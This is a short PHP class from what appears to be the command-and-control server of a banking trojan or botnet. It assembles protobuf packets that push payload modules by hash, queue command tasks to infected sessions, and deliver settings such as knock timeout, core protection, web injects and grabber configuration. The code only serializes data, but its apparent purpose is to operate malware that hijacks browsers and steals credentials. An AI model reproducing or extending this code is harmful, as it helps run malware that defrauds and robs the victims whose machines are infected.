<?php
require_once 'application/modules/protobuf/protocol/Packet.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';
class PacketData extends Packet {
    public function __construct()
    {
        $this->protoPacket = new data();
    }

    /**
     * @param $id int
     * @param $hash_x32 string
     * @param $hash_x64 string
     * @param $constantlyActive bool
     */
    public function addModule($id, $hash_x32, $hash_x64, $constantlyActive)
    {
        $module = $this->protoPacket->add_modules();
        $module->set_id($id);
        $module->set_hash_x32($hash_x32);
        $module->set_hash_x64($hash_x64);
        $module->set_constantlyActive($constantlyActive);
    }


    /**
     * @param $id int
     * @param $sid int
     * @param $command string
     * @param $context string
     */
    public function addTask($id, $sid, $command, $context)
    {
        $task = $this->protoPacket->add_tasks();
        $task->set_id($id);
        $task->set_sid($sid);
        $task->set_command($command);
        $task->set_context($context);
    }

    // int, bool, int
    public function setSettings($reportPolicy, $coreProtection, $knockTimeout)
    {
        $settings = new settings();
        $settings->set_reportPolicy($reportPolicy);
        $settings->set_coreProtection($coreProtection);
        $settings->set_knockTimeout($knockTimeout);
        $this->protoPacket->set_settings($settings);
    }

    public function setInjects($injects)
    {
        $this->protoPacket->set_injects($injects);
    }

    public function setGrabberSettings($grabberSettings)
    {
        $this->protoPacket->set_grabber_settings($grabberSettings);
    }
}
